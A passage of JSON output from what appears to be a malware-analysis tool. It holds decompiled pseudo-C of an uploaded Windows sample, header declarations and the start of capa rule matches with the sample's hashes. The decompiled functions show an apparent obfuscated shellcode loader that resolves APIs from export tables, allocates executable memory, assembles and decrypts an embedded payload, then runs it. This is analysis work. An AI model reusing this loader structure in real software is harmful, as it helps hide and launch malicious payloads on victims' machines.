    "      dword_18009D650 = v16 - 6684;",
    "      dword_18009D654 = v16 - 5092;",
    "      v13 = v14;",
    "      v12 = *(unsigned int *)(v20 + 4LL * v14);",
    "      v11 = 0;",
    "      do",
    "      {",
    "        dword_18009D654 = 5381;",
    "        v5 = v12 + v11;",
    "        v6 = *(_BYTE *)(v1 + v5) == *(_BYTE *)(a1 + v11);",
    "        dword_18009D654 = -3453;",
    "        v10 = v11;",
    "        v9 = (_BYTE *)(v11 + a1);",
    "        if ( !*(_BYTE *)(v1 + v5) )",
    "          break;",
    "        ++v11;",
    "      }",
    "      while ( v10 + 1 < 0x20 && *v9 != 0 && v6 );",
    "      if ( v6 )",
    "        break;",
    "      dword_18009D654 = 9386;",
    "      ++v14;",
    "      v16 -= 6684;",
    "      ++v15;",
    "      v17 = 0;",
    "      if ( v13 + 1 >= v19 )",
    "        return v17;",
    "    }",
    "    dword_18009D654 = v16 - 7729;",
    "    v7 = *(_DWORD *)(*(unsigned int *)(v1 + v3 + 28) + v1 + 4LL * *v15);",
    "    dword_18009D650 = 5419;",
    "    return v7 + v18;",
    "  }",
    "  return v17;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18000401C(__int64 a1, __int64 a2, __int64 a3)",
    "{",
    "  int v4; // [rsp+0h] [rbp-24h]",
    "  __int64 v5; // [rsp+4h] [rbp-20h]",
    "",
    "  dword_18009D654 = 1370;",
    "  dword_18009D650 = 2941;",
    "  v5 = 0;",
    "  v4 = 1635;",
    "  if ( a3 )",
    "  {",
    "    do",
    "    {",
    "      dword_18009D650 = 5512;",
    "      *(_BYTE *)(a1 + v5) = *(_BYTE *)(a2 + v5);",
    "      ++v5;",
    "    }",
    "    while ( v5 != a3 );",
    "    v4 = dword_18009D650 - 1306;",
    "  }",
    "  dword_18009D654 = v4;",
    "  return a1;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_1800040B0(__int64 a1)",
    "{",
    "  __int64 v1; // rax",
    "",
    "  dword_18009D650 = 8381;",
    "  v1 = sub_180004184();",
    "  return sub_180004737(v1, a1);",
    "}",
    "",
    "",
    "__int64 sub_1800040DC()",
    "{",
    "  _QWORD v1[4]; // [rsp+4h] [rbp-60h] BYREF",
    "",
    "  dword_18009D650 = 4525;",
    "  sub_180004254(v1);",
    "  return ((__int64 (__fastcall *)(__int64, __int64, __int64, __int64))v1[0])(",
    "           qword_18009D5E8,",
    "           qword_18009D5F0,",
    "           qword_18009D608,",
    "           qword_18009D610);",
    "}",
    "",
    "",
    "struct _LIST_ENTRY *sub_180004184()",
    "{",
    "  __m128i v0; // xmm0",
    "  __int64 j; // [rsp+0h] [rbp-78h]",
    "  __int64 i; // [rsp+8h] [rbp-70h]",
    "  _OWORD v4[6]; // [rsp+18h] [rbp-60h] BYREF",
    "",
    "  dword_18009D650 = 8033;",
    "  for ( i = 0; i != 14; ++i )",
    "    *((_BYTE *)&v4[4] + i) = byte_1800050D3[i] - byte_18000511A[i];",
    "  dword_18009D650 = 9122;",
    "  dword_18009D654 = 3446;",
    "  for ( j = 0; j != 4; ++j )",
    "  {",
    "    v0 = _mm_loadl_epi64((const __m128i *)((char *)&v4[4] + j * 8));",
    "    v4[j] = _mm_srai_epi16(_mm_unpacklo_epi8(v0, v0), 8u);",
    "  }",
    "  dword_18009D650 = -4995;",
    "  dword_18009D654 = 5429;",
    "  return sub_180003B4B((__int64)v4, 0);",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180004254(_QWORD *a1)",
    "{",
    "  bool v1; // zf",
    "  struct _LIST_ENTRY *v2; // rax",
    "  __int64 (__fastcall *v3)(_QWORD, _QWORD, __int64, __int64); // rax",
    "  __int64 v4; // rax",
    "  int v5; // r10d",
    "  __int64 v6; // r8",
    "  unsigned int v7; // r11d",
    "  int v9; // [rsp+10h] [rbp-178h]",
    "  __int64 v10; // [rsp+20h] [rbp-168h]",
    "  unsigned int v11; // [rsp+2Ch] [rbp-15Ch]",
    "  __int64 v12; // [rsp+30h] [rbp-158h]",
    "  __int64 v13; // [rsp+38h] [rbp-150h]",
    "  __int64 i; // [rsp+48h] [rbp-140h]",
    "  unsigned int v15; // [rsp+50h] [rbp-138h]",
    "  unsigned int v16; // [rsp+54h] [rbp-134h]",
    "  __int64 v17; // [rsp+58h] [rbp-130h]",
    "  _BYTE v19[32]; // [rsp+68h] [rbp-120h] BYREF",
    "  _BYTE v20[256]; // [rsp+88h] [rbp-100h] BYREF",
    "",
    "  dword_18009D654 = 5219;",
    "  dword_18009D650 = 4735;",
    "  v17 = 0;",
    "  v16 = 0;",
    "  do",
    "  {",
    "    v1 = v17 == 2074;",
    "    v15 = v16 + (*((_DWORD *)&unk_180081000 + 14 * v17) ^ *((_DWORD *)&unk_180081000 + 14 * v17 + 11));",
    "    ++v17;",
    "    v16 = v15;",
    "  }",
    "  while ( !v1 );",
    "  dword_18009D654 = -3208;",
    "  dword_18009D650 = 5335;",
    "  for ( i = 0; i != 14; ++i )",
    "    v19[i] = byte_18000512B[i] - byte_18000511A[i];",
    "  dword_18009D654 = 3446;",
    "  dword_18009D650 = 8381;",
    "  v2 = sub_180004184();",
    "  v3 = (__int64 (__fastcall *)(_QWORD, _QWORD, __int64, __int64))sub_180004737(v2, v19);",
    "  v4 = v3(0, v15, 4096, 64);",
    "  dword_18009D654 = 6193;",
    "  v13 = v4;",
    "  v12 = 0;",
    "  v11 = 0;",
    "  do",
    "  {",
    "    v5 = *((_DWORD *)&unk_180081000 + 14 * v12 + 11);",
    "    v6 = *((_QWORD *)&unk_180081000 + 7 * v12 + 6);",
    "    v7 = *((_DWORD *)&unk_180081000 + 14 * v12);",
    "    dword_18009D650 = 3572;",
    "    dword_18009D654 = 4688;",
    "    v10 = v12;",
    "    v9 = v5 ^ v7;",
    "    sub_18000401C(v11 + v13, v6, v5 ^ v7);",
    "    dword_18009D654 = dword_18009D650 + 1957;",
    "    ++v12;",
    "    v11 += v9;",
    "  }",
    "  while ( v10 != 2074 );",
    "  dword_18009D654 = 7411;",
    "  sub_180003575((__int64)v20, (__int64)&unk_1800050F9, 0x20u);",
    "  dword_18009D650 -= 2510;",
    "  sub_18000390E((__int64)v20, v13, v13, v15);",
    "  *a1 = v13 + 337039;",
    "  dword_18009D650 = 8698;",
    "  a1[1] = 3678520;",
    "  return 0;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180004569(__int64 a1)",
    "{",
    "  char v1; // r9",
    "  unsigned int v3; // [rsp+0h] [rbp-10h]",
    "  unsigned int v4; // [rsp+4h] [rbp-Ch]",
    "",
    "  dword_18009D650 = 9301;",
    "  v4 = 0;",
    "  do",
    "  {",
    "    v1 = *(_BYTE *)(a1 + v4);",
    "    v3 = v4++;",
    "  }",
    "  while ( v1 );",
    "  return v3;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_1800045B0(__int64 a1, __int64 a2, int a3)",
    "{",
    "  int v3; // edx",
    "  char v4; // r9",
    "  __int64 result; // rax",
    "  __int64 v6; // [rsp+0h] [rbp-28h]",
    "",
    "  if ( a3 )",
    "  {",
    "    v6 = 0;",
    "    do",
    "    {",
    "      dword_18009D650 = 9122;",
    "      v3 = v6;",
    "      v4 = byte_18000511A[v6 & 0xF];",
    "      dword_18009D654 = 9820;",
    "      *(_BYTE *)(a1 + v6) = *(_BYTE *)(a2 + v6) - v4;",
    "      result = ++v6;",
    "    }",
    "    while ( v3 != a3 - 1 );",
    "  }",
    "  dword_18009D654 = 3446;",
    "  return result;",
    "}",
    "",
    "",
    "struct _LIST_ENTRY *sub_180004645()",
    "{",
    "  __m128i v0; // xmm0",
    "  __int64 j; // [rsp+8h] [rbp-80h]",
    "  __int64 i; // [rsp+10h] [rbp-78h]",
    "  _OWORD v4[6]; // [rsp+28h] [rbp-60h] BYREF",
    "",
    "  dword_18009D654 = dword_18009D650 - 3004;",
    "  dword_18009D650 = 2787;",
    "  for ( i = 0; i != 11; ++i )",
    "    *((_BYTE *)&v4[4] + i) = byte_1800050C8[i] - byte_18000511A[i];",
    "  dword_18009D654 = 3446;",
    "  dword_18009D650 = 7012;",
    "  for ( j = 0; j != 4; ++j )",
    "  {",
    "    v0 = _mm_loadl_epi64((const __m128i *)((char *)&v4[4] + j * 8));",
    "    v4[j] = _mm_srai_epi16(_mm_unpacklo_epi8(v0, v0), 8u);",
    "  }",
    "  dword_18009D650 = 1215;",
    "  dword_18009D654 = 5429;",
    "  return sub_180003B4B((__int64)v4, 0);",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180004737(__int64 a1, __int64 a2)",
    "{",
    "  void (__fastcall *v2)(__int64, _WORD *, _QWORD, __int64 *); // rax",
    "  char v3; // r9",
    "  __int16 v5; // [rsp+8h] [rbp-68h]",
    "  unsigned int v6; // [rsp+Ch] [rbp-64h]",
    "  __int64 v7; // [rsp+18h] [rbp-58h]",
    "  __int64 i; // [rsp+20h] [rbp-50h]",
    "  __int64 v11; // [rsp+38h] [rbp-38h] BYREF",
    "  _WORD v12[4]; // [rsp+40h] [rbp-30h] BYREF",
    "  __int64 v13; // [rsp+48h] [rbp-28h]",
    "  _BYTE v14[32]; // [rsp+50h] [rbp-20h] BYREF",
    "",
    "  for ( i = 0; i != 24; ++i )",
    "    v14[i] = byte_1800050E1[i] - byte_18000511A[i & 0xF];",
    "  dword_18009D650 = 9122;",
    "  dword_18009D654 = 3446;",
    "  v7 = 0;",
    "  if ( a2 )",
    "  {",
    "    dword_18009D654 = 4067;",
    "    v2 = (void (__fastcall *)(__int64, _WORD *, _QWORD, __int64 *))sub_180003DB7((__int64)v14);",
    "    dword_18009D654 = 9407;",
    "    v7 = 0;",
    "    if ( v2 )",
    "    {",
    "      v13 = a2;",
    "      dword_18009D650 = 9301;",
    "      v6 = 0;",
    "      do",
    "      {",
    "        v3 = *(_BYTE *)(a2 + v6);",
    "        v5 = v6++;",
    "      }",
    "      while ( v3 );",
    "      v12[0] = v5;",
    "      v12[1] = v5;",
    "      v7 = 0;",
    "      if ( v5 )",
    "      {",
    "        v11 = 0;",
    "        v2(a1, v12, 0, &v11);",
    "        return v11;",
    "      }",
    "    }",
    "  }",
    "  return v7;",
    "}",
    "",
    "",
    "void  sub_180004892()",
    "{",
    "  BUG();",
    "}",
    "",
    ""
  ],
  "h_code": [
    "#include <windows.h>",
    "#include <stdint.h>",
    "#include <stdio.h>",
    "",
    "#include \"defs.h\"",
    "",
    "void JUMPOUT(int a) {",
    "}",
    "",
    "unsigned int _bss_start__ = 0;",
    "unsigned int __cxa_finalize = 0;",
    "char __fastcall sub_180001000(char a1, char a2);",
    "void *sub_180001051();",
    "__int64 __fastcall sub_18000105E(void *a1, DWORD a2);",
    "__int64 sub_180001083();",
    "__int64 sub_18000130B();",
    "// local variable allocation has failed, the output may be wrong!",
    "BOOL __stdcall DllEntryPoint(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved);",
    "void __fastcall sub_180001A42();",
    "// attributes: thunk",
    "LSTATUS __stdcall RegOpenUserClassesRoot(HANDLE hToken, DWORD dwOptions, REGSAM samDesired, PHKEY phkResult);",
    "// attributes: thunk",
    "DWORD __stdcall WaitForInputIdle(HANDLE hProcess, DWORD dwMilliseconds);",
    "// attributes: thunk",
    "LPSTR __stdcall CharPrevExA(WORD CodePage, LPCSTR lpStart, LPCSTR lpCurrentChar, DWORD dwFlags);",
    "// attributes: thunk",
    "HDC __stdcall BeginPaint(HWND hWnd, LPPAINTSTRUCT lpPaint);",
    "// attributes: thunk",
    "BOOL __stdcall EnableWindow(HWND hWnd, BOOL bEnable);",
    "// attributes: thunk",
    "BOOL __stdcall EndDialog(HWND hDlg, INT_PTR nResult);",
    "// attributes: thunk",
    "DWORD __stdcall WaitForSingleObject(HANDLE hHandle, DWORD dwMilliseconds);",
    "// attributes: thunk",
    "DWORD __stdcall GetModuleFileNameA(HMODULE hModule, LPSTR lpFilename, DWORD nSize);",
    "// attributes: thunk",
    "HMODULE __stdcall LoadLibraryExW(LPCWSTR lpLibFileName, HANDLE hFile, DWORD dwFlags);",
    "// attributes: thunk",
    "HMODULE __stdcall GetModuleHandleW(LPCWSTR lpModuleName);",
    "// attributes: thunk",
    "BOOL __stdcall GetStringTypeA(LCID Locale, DWORD dwInfoType, LPCSTR lpSrcStr, int cchSrc, LPWORD lpCharType);",
    "// attributes: thunk",
    "BOOL __stdcall SetConsoleMode(HANDLE hConsoleHandle, DWORD dwMode);",
    "// attributes: thunk",
    "int __stdcall GetThreadPriority(HANDLE hThread);",
    "// attributes: thunk",
    "DWORD __stdcall EraseTape(HANDLE hDevice, DWORD dwEraseType, BOOL bImmediate);",
    "// attributes: thunk",
    "BOOL __stdcall IsValidLocale(LCID Locale, DWORD dwFlags);",
    "// attributes: thunk",
    "int __stdcall SetStretchBltMode(HDC hdc, int mode);",
    "// attributes: thunk",
    "UINT __stdcall SetDIBColorTable(HDC hdc, UINT iStart, UINT cEntries, const RGBQUAD *prgbq);",
    "// attributes: thunk",
    "BOOL __stdcall PaintRgn(HDC hdc, HRGN hrgn);",
    "// attributes: thunk",
    "HGDIOBJ __stdcall GetStockObject(int i);",
    "// attributes: thunk",
    "HDC __stdcall CreateCompatibleDC(HDC hdc);",
    "// attributes: thunk",
    "BOOL __stdcall EndPath(HDC hdc);",
    "unsigned __int64 __fastcall _alloca_probe();",
    "void  sub_18000339E();",
    "struct _TEB *sub_180003520();",
    "struct _PEB *sub_180003546();",
    "__int64 __fastcall sub_180003575(__int64 a1, __int64 a2, unsigned int a3);",
    "unsigned __int64 __fastcall sub_180003708(unsigned int a1);",
    "__int64 __fastcall sub_18000372A(__int64 a1);",
    "__int16 __fastcall sub_180003762(__int16 a1);",
    "__int64 (__fastcall *sub_180003812())();",
    "__int64 __fastcall sub_18000387D(__int64 a1);",
    "__int64 __fastcall sub_18000390E(__int64 a1, __int64 a2, __int64 a3, int a4);",
    "__int64 __fastcall sub_180003AC2(__int64 a1, __int64 a2, int a3);",
    "struct _LIST_ENTRY *__fastcall sub_180003B4B(__int64 a1, struct _LIST_ENTRY *a2);",
    "__int64 __fastcall sub_180003DB7(__int64 a1);",
    "__int64 __fastcall sub_18000401C(__int64 a1, __int64 a2, __int64 a3);",
    "__int64 __fastcall sub_1800040B0(__int64 a1);",
    "__int64 sub_1800040DC();",
    "struct _LIST_ENTRY *sub_180004184();",
    "__int64 __fastcall sub_180004254(_QWORD *a1);",
    "__int64 __fastcall sub_180004569(__int64 a1);",
    "__int64 __fastcall sub_1800045B0(__int64 a1, __int64 a2, int a3);",
    "struct _LIST_ENTRY *sub_180004645();",
    "__int64 __fastcall sub_180004737(__int64 a1, __int64 a2);",
    "void  sub_180004892();"
  ],
  "summary": [],
  "yara_rules": "",
  "capa_rules": {
    "meta": {
      "timestamp": "2025-07-08T03:05:03.948572",
      "version": "9.2.1",
      "argv": [
        "-r",
        "G:\\화이트햇스쿨\\Web\\YARRAI_Web\\backend\\services\\CAPA\\capa-rules",
        "-s",
        "G:\\화이트햇스쿨\\Web\\YARRAI_Web\\backend\\services\\CAPA\\capa-sigs",
        "--json",
        "G:\\화이트햇스쿨\\Web\\YARRAI_Web\\backend\\uploads\\2c986a81-d3a5-4abe-b11d-58aa8d1bc299.exe"
      ],
      "sample": {
        "md5": "fe29ff06620f100ed30f591311d797e1",
        "sha1": "fbdc10b7b9e5107677d49f6e3da459956dbd409a",
        "sha256": "a4ff0e94ef541c0ea4d46229180370817c5383de7f774f9803f551bb5103624f",
        "path": "G:/화이트햇스쿨/Web/YARRAI_Web/backend/uploads/2c986a81-d3a5-4abe-b11d-58aa8d1bc299.exe"
      },
      "flavor": "static",
      "analysis": {
        "format": "pe",
        "arch": "amd64",
        "os": "windows",
        "extractor": "VivisectFeatureExtractor",
        "rules": [
          "G:/화이트햇스쿨/Web/YARRAI_Web/backend/services/CAPA/capa-rules"
        ],
        "base_address": {
          "type": "absolute",
          "value": 6442450944
        },
        "layout": {
          "functions": [
            {
              "address": {
                "type": "absolute",
                "value": 6442455040
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442455040
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442455134
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442455139
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442455160
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442455171
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442455171
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442455414
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442455580
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442455614
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442455802
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442455819
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442455880
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442456567
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442456669
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442456864
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442456928
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442457007
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442457211
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442457367
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442457484
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442457484
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442457666
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442457545
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442457666
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442464582
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442464582
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442464629
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442464698
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442464735
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442464780
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442465021
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442465066
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442465066
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442465122
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442465122
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442465216
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442465288
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442465298
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442465319
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442465365
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442465375
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442465405
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442465405
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442465491
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442465540
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442465550
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442465550
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442465648
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442465687
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442465929
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442465977
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442465986
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442465986
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442466123
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442466123
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442466223
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442466335
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442466394
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442466442
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442466729
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442466743
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442466743
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442466879
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442466926
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442467012
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442467103
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442467198
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442467265
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442467341
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442467356
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442467356
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442467423
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442467471
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442467485
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442467504
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442467504
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442469203
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442469389
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442469509
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442467716
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442467753
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442467838
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442467881
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442467924
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442467981
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442468110
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442468298
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442468540
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442468713
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442468740
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442468775
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442468784
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442468784
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442468813
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442468832
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442468917
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442468933
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442468933
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442468993
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442469075
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442469118
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442469175
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442469203
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442469389
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442469509
                  }
                }
              ]
            }
          ]
        },
        "feature_counts": {
          "file": 77777,
          "functions": [
            {
              "address": {
                "type": "absolute",
                "value": 6442455040
              },
              "count": 18
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442455121
              },
              "count": 10
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442455134
              },
              "count": 27
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442455171
              },
              "count": 94
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442455819
              },
              "count": 175
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442457484
              },
              "count": 32
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442457666
              },
              "count": 38
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442464158
              },
              "count": 10
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442464544
              },
              "count": 15
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442464582
              },
              "count": 20
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442464629
              },
              "count": 61
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442465032
              },
              "count": 15
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442465066
              },
              "count": 23
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442465122
              },
              "count": 48
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442465298
              },
              "count": 31
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442465405
              },
              "count": 48
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442465550
              },
              "count": 62
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442465986
              },
              "count": 23
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442466123
              },
              "count": 104
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442466743
              },
              "count": 91
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442467356
              },
              "count": 46
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442467504
              },
              "count": 66
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442467548
              },
              "count": 19
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442467716
              },
              "count": 61
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442467924
              },
              "count": 102
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442468713
              },
              "count": 33
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442468784
              },
              "count": 48
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442468933
              },
              "count": 64
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442469175
              },
              "count": 60
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442469522
              },
              "count": 10
            }
          ]
        },
        "library_functions": [
          {
            "address": {
              "type": "absolute",
              "value": 6442464080
            },
            "name": "_alloca_probe"
          }
        ]
      }
    },
    "rules": {
      "calculate modulo 256 via x86 assembly": {
        "meta": {
          "name": "calculate modulo 256 via x86 assembly",
          "authors": [
            "moritz.raabe@mandiant.com"
          ],
          "scopes": {
            "static": "instruction"
          },
          "attack": [],
          "mbc": [
            {
              "parts": [
                "Data",
                "Modulo"
              ],
              "objective": "Data",
              "behavior": "Modulo",
              "method": "",
              "id": "C0058"
            }
          ],
          "references": [],
          "examples": [
            "9324D1A8AE37A36AE560C37448C9705A:0x4049A9"
          ],
          "description": "",
          "lib": true,
          "is_subscope_rule": false,
          "maec": {}
        },
        "source": "rule:\r\n  meta:\r\n    name: calculate modulo 256 via x86 assembly\r\n    authors:\r\n      - moritz.raabe@mandiant.com\r\n    lib: true\r\n    scopes:\r\n      static: instruction\r\n      dynamic: unsupported  # requires mnemonic features\r\n    mbc:\r\n      - Data::Modulo [C0058]\r\n    examples:\r\n      - 9324D1A8AE37A36AE560C37448C9705A:0x4049A9\r\n  features:\r\n    #  and ecx, 800000FFh\r\n    #  and ecx, 0FFh\r\n    - and:\r\n      - or:\r\n        - arch: i386\r\n        - arch: amd64\r\n      - mnemonic: and\r\n      - or:\r\n        - number: 0x800000FF\r\n        - number: 0xFF\r\n",
        "matches": [
          [
            {
              "type": "absolute",
              "value": 6442465853
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "and"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "or"
                    }
                  },
                  "children": [
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "arch",
                          "arch": "i386"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "arch",
                          "arch": "amd64"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "no address"
                        }
                      ],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "mnemonic",
                      "mnemonic": "and"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442465853
                    }
                  ],
